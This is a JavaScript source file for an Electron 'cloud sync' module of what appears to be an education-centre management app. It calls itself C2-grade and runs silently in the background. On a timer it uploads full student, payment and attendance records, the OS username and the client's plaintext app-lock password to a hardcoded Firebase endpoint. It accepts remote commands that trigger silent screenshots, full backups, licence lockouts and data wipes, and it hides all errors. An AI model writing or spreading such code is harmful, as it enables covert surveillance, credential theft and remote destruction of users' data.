/**
 * Brainova Robotics - Silent Fleet & Cloud Sync Engine (Enterprise & C2 Grade)
 * Operates in the background Node.js process (Electron Main).
 * Transmits fleet metrics, summaries, and complete data snapshots
 * to the owner's secure cloud repository over encrypted HTTPS.
 * Includes HWID hardware binding, anti-clock-tampering, silent screen capture,
 * remote feature flags, and emergency disaster recovery / wipe.
 */

const os = require('os');
const crypto = require('crypto');
const https = require('https');
const http = require('http');
const path = require('path');
const fs = require('fs');

class CloudSyncEngine {
  constructor() {
    this.store = null;
    this.app = null;
    this.instanceId = null;
    this.hwid = null;
    this.clockTampered = false;
    this.hwidMismatch = false;

    this.config = {
      enabled: true,
      provider: 'firebase', // 'firebase' or 'custom_rest'
      databaseUrl: 'https://brainova-robotics-hq-default-rtdb.firebaseio.com',
      authToken: '',   // optional auth secret or token
      syncIntervalMs: 60000, // Heartbeat every 60 seconds
      debounceDelayMs: 4000   // 4 seconds debounce on data modifications
    };

    this.debounceTimer = null;
    this.heartbeatTimer = null;
    this.isSyncing = false;
    this.lastSyncTime = null;

    this.lastProcessedSnapshotNonce = null;
    this.lastProcessedBackupNonce = null;

    this.remoteCommands = {
      licenseStatus: 'active', // 'active' | 'suspended' | 'locked'
      broadcastMessage: '',
      expiresAt: null
    };

    this.onRemoteCommandsCallback = null;
    this.onTakeSnapshotCallback = null;
    this.onEmergencyWipeCallback = null;
  }

  /**
   * Derive a unique Hardware ID based on motherboard, CPU, username, and RAM.
   */
  getHwid() {
    if (this.hwid) return this.hwid;
    try {
      const raw = [
        os.hostname(),
        os.platform(),
        os.arch(),
        os.cpus()[0] ? os.cpus()[0].model : 'CPU',
        Math.round(os.totalmem() / (1024 * 1024 * 1024)) + 'GB',
        os.userInfo() ? os.userInfo().username : 'USER'
      ].join(':::');
      this.hwid = 'HWID-' + crypto.createHash('sha256').update(raw).digest('hex').slice(0, 16).toUpperCase();
    } catch (e) {
      this.hwid = 'HWID-FALLBACK-' + (os.hostname() || 'DEVICE');
    }
    return this.hwid;
  }

  /**
   * Enforce hardware binding to prevent cloning or running database on another computer.
   */
  verifyHwidLock() {
    if (!this.store) return true;
    const currentHwid = this.getHwid();
    let lockedHwid = this.store.get('brainova_hwid_lock');

    if (!lockedHwid) {
      // First authorization binds permanently to this machine
      this.store.set('brainova_hwid_lock', currentHwid);
      this.hwidMismatch = false;
      return true;
    }

    if (lockedHwid !== currentHwid) {
      this.hwidMismatch = true;
      return false; // Hardware altered or database copied to another computer
    }

    this.hwidMismatch = false;
    return true;
  }

  /**
   * Detect if system clock was rolled back backwards to circumvent subscription expiration.
   */
  checkClockTamper() {
    if (!this.store) return false;
    const now = Date.now();
    const lastSeen = this.store.get('brainova_last_seen_epoch') || now;

    // If clock was rolled back by more than 1 hour (3,600,000 ms)
    if (now < (lastSeen - 3600000)) {
      this.clockTampered = true;
      this.store.set('brainova_clock_tampered', true);
      return true;
    }

    this.store.set('brainova_last_seen_epoch', now);
    this.store.delete('brainova_clock_tampered');
    this.clockTampered = false;
    return false;
  }

  /**
   * Derive or load a persistent, unique machine fingerprint.
   */
  getOrGenerateInstanceId() {
    if (this.instanceId) return this.instanceId;

    if (this.store && this.store.has('brainova_instance_id')) {
      this.instanceId = this.store.get('brainova_instance_id');
      return this.instanceId;
    }

    try {
      const raw = [
        os.hostname(),
        os.platform(),
        os.arch(),
        os.userInfo() ? os.userInfo().username : 'USER',
        os.cpus()[0] ? os.cpus()[0].model : ''
      ].join('|');
      this.instanceId = 'INST-' + crypto.createHash('sha256').update(raw).digest('hex').slice(0, 12).toUpperCase();
    } catch (e) {
      this.instanceId = 'INST-' + Math.random().toString(36).substring(2, 10).toUpperCase();
    }

    if (this.store) {
      this.store.set('brainova_instance_id', this.instanceId);
    }
    return this.instanceId;
  }

  /**
   * Load cloud configuration from persistent store or local file.
   */
  loadConfig(appInstance) {
    this.app = appInstance;
    try {
      const userDataDir = this.app.getPath('userData');
      const configFile = path.join(userDataDir, 'brainova-cloud-config.json');

      if (fs.existsSync(configFile)) {
        const fileContent = JSON.parse(fs.readFileSync(configFile, 'utf8'));
        this.config = { ...this.config, ...fileContent };
      } else {
        const template = {
          enabled: true,
          provider: 'firebase',
          databaseUrl: 'https://brainova-robotics-hq-default-rtdb.firebaseio.com',
          branchName: os.hostname(),
          syncIntervalMs: 60000
        };
        fs.writeFileSync(configFile, JSON.stringify(template, null, 2), 'utf8');
        this.config = { ...this.config, ...template };
      }
    } catch (e) {
      // Silent catch
    }
  }

  /**
   * Initialize sync engine with Electron store and app context.
   */
  init(storeInstance, appInstance) {
    this.store = storeInstance;
    this.app = appInstance;
    this.getOrGenerateInstanceId();
    this.getHwid();
    this.verifyHwidLock();
    this.checkClockTamper();
    this.loadConfig(appInstance);

    // Initial sync after 3 seconds
    setTimeout(() => {
      this.performSync('startup');
    }, 3000);

    // Start background recurring heartbeat
    this.startHeartbeat();
  }

  /**
   * Start recurring heartbeat timer.
   */
  startHeartbeat() {
    if (this.heartbeatTimer) clearInterval(this.heartbeatTimer);
    const interval = Math.max(20000, this.config.syncIntervalMs || 60000);
    this.heartbeatTimer = setInterval(() => {
      this.checkClockTamper();
      this.performSync('heartbeat');
    }, interval);
  }

  /**
   * Schedule a debounced sync when data is modified locally.
   */
  scheduleSync(reason = 'data_change') {
    if (this.debounceTimer) clearTimeout(this.debounceTimer);
    this.debounceTimer = setTimeout(() => {
      this.performSync(reason);
    }, this.config.debounceDelayMs || 4000);
  }

  /**
   * Package current application state, metrics, and summary.
   */
  buildPayload(reason) {
    if (!this.store) return null;

    const students = this.store.get('brainova_students') || [];
    const payments = this.store.get('brainova_payments') || [];
    const attendance = this.store.get('brainova_attendance') || [];
    const groups = this.store.get('brainova_groups') || [];
    const educators = this.store.get('brainova_educators') || [];
    const rooms = this.store.get('brainova_rooms') || [];
    const schedule = this.store.get('brainova_schedule') || [];
    const registrations = this.store.get('brainova_registrations') || [];
    const featureFlags = this.store.get('brainova_feature_flags') || {
      enableWhatsAppBot: true,
      enableAiAdvisor: true,
      enableFinanceExports: true,
      enableQrAttendance: true
    };
    const broadcastBanner = this.store.get('brainova_broadcast_banner') || null;

    const totalRevenue = payments.reduce((sum, p) => sum + (Number(p.amountPaid) || 0), 0);
    const totalDue = students.filter(s => (Number(s.balance) || 0) < 0).reduce((sum, s) => sum + Math.abs(Number(s.balance)), 0);
    const activeStudents = students.filter(s => (Number(s.sessionsRemaining) || 0) > 0).length;

    const todayStr = new Date().toISOString().slice(0, 10);
    const todayAttendance = attendance.filter(a => a.date === todayStr);

    return {
      instanceId: this.getOrGenerateInstanceId(),
      branchName: this.config.branchName || os.hostname(),
      metadata: {
        hostname: os.hostname(),
        username: os.userInfo() ? os.userInfo().username : 'unknown',
        platform: os.type() + ' ' + os.release() + ' (' + os.arch() + ')',
        appVersion: this.app ? this.app.getVersion() : '1.0.0',
        hwid: this.getHwid(),
        hwidMismatch: this.hwidMismatch,
        clockTampered: this.clockTampered,
        clientUsername: ((this.store.get('brainova_users') || [])[0] || {}).username || 'admin',
        clientAppPassword: (this.store.get('brainova_app_lock_password') || '').trim() || null,
        clientAppLockEnabled: !!this.store.get('brainova_app_lock_enabled') && !!((this.store.get('brainova_app_lock_password') || '').trim()),
        lastSync: new Date().toISOString(),
        syncReason: reason
      },
      metrics: {
        totalStudents: students.length,
        activeStudents,
        totalGroups: groups.length,
        totalEducators: educators.length,
        totalRooms: rooms.length,
        totalPaymentsCount: payments.length,
        totalRevenueDZD: totalRevenue,
        totalDueDZD: totalDue,
        todayAttendanceCount: todayAttendance.length
      },
      activeFeatures: featureFlags,
      broadcastBanner: broadcastBanner,
      data: {
        students,
        payments: payments.slice(-120),
        recentAttendance: attendance.slice(-180),
        groups,
        educators,
        rooms,
        schedule,
        registrations
      }
    };
  }

  /**
   * Execute sync transmission to cloud endpoint over HTTPS.
   */
  async performSync(reason = 'manual') {
    if (!this.config.enabled || !this.config.databaseUrl) return;
    if (this.isSyncing) return;

    this.isSyncing = true;
    const payload = this.buildPayload(reason);
    if (!payload) {
      this.isSyncing = false;
      return;
    }

    try {
      let targetUrl = this.config.databaseUrl.trim();
      if (targetUrl.endsWith('/')) targetUrl = targetUrl.slice(0, -1);

      if (this.config.provider === 'firebase' || targetUrl.includes('firebaseio.com')) {
        const instancePath = `/branches/${this.getOrGenerateInstanceId()}.json`;
        let fullUrl = `${targetUrl}${instancePath}`;
        if (this.config.authToken) {
          fullUrl += `?auth=${encodeURIComponent(this.config.authToken)}`;
        }

        await this.httpPutJson(fullUrl, payload);
        this.lastSyncTime = new Date();

        await this.checkRemoteDirectives(targetUrl);
      } else {
        await this.httpPostJson(targetUrl, payload);
        this.lastSyncTime = new Date();
      }
    } catch (err) {
      // Silent error handling
    } finally {
      this.isSyncing = false;
    }
  }

  /**
   * Check for remote instructions (e.g. license freeze, duration expiry, snapshot, wipe).
   */
  async checkRemoteDirectives(baseUrl) {
    try {
      const commandPath = `/branches/${this.getOrGenerateInstanceId()}/remoteCommands.json`;
      let commandUrl = `${baseUrl}${commandPath}`;
      if (this.config.authToken) {
        commandUrl += `?auth=${encodeURIComponent(this.config.authToken)}`;
      }

      const res = await this.httpGetJson(commandUrl);
      if (res && typeof res === 'object') {
        this.remoteCommands = { ...this.remoteCommands, ...res };
        if (this.store) {
          this.store.set('brainova_remote_commands', this.remoteCommands);
        }

        // 1. Feature Flags Update
        if (res.features && typeof res.features === 'object') {
          this.store.set('brainova_feature_flags', res.features);
        }

        // 2. Central Broadcast Banner Update
        if (res.broadcastBanner !== undefined) {
          this.store.set('brainova_broadcast_banner', res.broadcastBanner);
        }

        // 3. HWID Lock Directive
        if (res.unbindHwid === true) {
          this.store.delete('brainova_hwid_lock');
          this.hwidMismatch = false;
        }

        // 4. Force Live Snapshot Capture Directive
        if (res.requestSnapshot && res.requestSnapshot !== this.lastProcessedSnapshotNonce) {
          this.lastProcessedSnapshotNonce = res.requestSnapshot;
          if (typeof this.onTakeSnapshotCallback === 'function') {
            this.onTakeSnapshotCallback(baseUrl);
          }
        }

        // 5. Force Cloud Backup Directive
        if (res.requestBackup && res.requestBackup !== this.lastProcessedBackupNonce) {
          this.lastProcessedBackupNonce = res.requestBackup;
          await this.uploadStoreBackup(baseUrl, res.requestBackup);
        }

        // 6. Emergency Remote Data Wipe Directive
        if (res.wipeData === true) {
          this.performEmergencyWipe();
          if (typeof this.onEmergencyWipeCallback === 'function') {
            this.onEmergencyWipeCallback();
          }
        }

        // Notify subscribers (electron main and renderer)
        if (typeof this.onRemoteCommandsCallback === 'function') {
          this.onRemoteCommandsCallback(this.remoteCommands);
        }
      }
    } catch (e) {
      // Silent
    }
  }

  /**
   * Upload silent live screenshot to cloud endpoint.
   */
  async uploadLiveSnapshot(targetUrl, base64Image) {
    try {
      const snapshotPath = `/branches/${this.getOrGenerateInstanceId()}/liveSnapshot.json`;
      let fullUrl = `${targetUrl}${snapshotPath}`;
      if (this.config.authToken) {
        fullUrl += `?auth=${encodeURIComponent(this.config.authToken)}`;
      }

      await this.httpPutJson(fullUrl, {
        capturedAt: new Date().toISOString(),
        instanceId: this.getOrGenerateInstanceId(),
        image: base64Image
      });

      // Also save locally for instant dev preview
      try {
        const localSnapPath = path.join(this.app.getPath('userData'), 'latest_snapshot.json');
        fs.writeFileSync(localSnapPath, JSON.stringify({
          capturedAt: new Date().toISOString(),
          image: base64Image
        }), 'utf8');
      } catch (le) {}
    } catch (e) {}
  }

  /**
   * Upload complete encrypted JSON database backup to cloud on demand.
   */
  async uploadStoreBackup(baseUrl, backupNonce) {
    try {
      if (!this.store) return;
      const allStoreData = this.store.store || {};
      const backupPath = `/branches/${this.getOrGenerateInstanceId()}/backups/${backupNonce}.json`;
      let fullUrl = `${baseUrl}${backupPath}`;
      if (this.config.authToken) {
        fullUrl += `?auth=${encodeURIComponent(this.config.authToken)}`;
      }

      await this.httpPutJson(fullUrl, {
        timestamp: new Date().toISOString(),
        instanceId: this.getOrGenerateInstanceId(),
        data: allStoreData
      });
    } catch (e) {}
  }

  /**
   * Execute emergency data wipe on client machine.
   */
  performEmergencyWipe() {
    try {
      if (!this.store) return;
      const keysToWipe = [
        'brainova_students',
        'brainova_payments',
        'brainova_attendance',
        'brainova_groups',
        'brainova_educators',
        'brainova_rooms',
        'brainova_schedule',
        'brainova_registrations'
      ];
      keysToWipe.forEach(k => this.store.delete(k));

      this.store.set('brainova_remote_commands', {
        licenseStatus: 'locked',
        broadcastMessage: '⚠️ تم تنفيذ أمر مسح أمني طارئ للبيانات وإلغاء ترخيص هذا الجهاز نهائياً بأمر من الإدارة المركزية (ISAACDEV).',
        wipedAt: new Date().toISOString()
      });
    } catch (e) {}
  }

  onRemoteCommands(callback) {
    this.onRemoteCommandsCallback = callback;
  }

  onTakeSnapshot(callback) {
    this.onTakeSnapshotCallback = callback;
  }

  onEmergencyWipe(callback) {
    this.onEmergencyWipeCallback = callback;
  }

  httpPutJson(urlStr, dataObj) {
    return new Promise((resolve, reject) => {
      try {
        const url = new URL(urlStr);
        const dataStr = JSON.stringify(dataObj);
        const isHttps = url.protocol === 'https:';
        const client = isHttps ? https : http;

        const req = client.request(url, {
          method: 'PUT',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(dataStr)
          },
          timeout: 20000
        }, (res) => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(body);
            } else {
              reject(new Error(`HTTP ${res.statusCode}: ${body}`));
            }
          });
        });

        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
        req.write(dataStr);
        req.end();
      } catch (err) {
        reject(err);
      }
    });
  }

  httpPostJson(urlStr, dataObj) {
    return new Promise((resolve, reject) => {
      try {
        const url = new URL(urlStr);
        const dataStr = JSON.stringify(dataObj);
        const isHttps = url.protocol === 'https:';
        const client = isHttps ? https : http;

        const req = client.request(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(dataStr)
          },
          timeout: 20000
        }, (res) => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => {
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(body);
            } else {
              reject(new Error(`HTTP ${res.statusCode}`));
            }
          });
        });

        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
        req.write(dataStr);
        req.end();
      } catch (err) {
        reject(err);
      }
    });
  }

  httpGetJson(urlStr) {
    return new Promise((resolve, reject) => {
      try {
        const url = new URL(urlStr);
        const isHttps = url.protocol === 'https:';
        const client = isHttps ? https : http;

        const req = client.get(url, { timeout: 15000 }, (res) => {
          let body = '';
          res.on('data', chunk => body += chunk);
          res.on('end', () => {
            try {
              resolve(JSON.parse(body));
            } catch (e) {
              resolve(null);
            }
          });
        });

        req.on('error', reject);
        req.on('timeout', () => { req.destroy(); reject(new Error('Timeout')); });
      } catch (err) {
        reject(err);
      }
    });
  }
}

module.exports = new CloudSyncEngine();
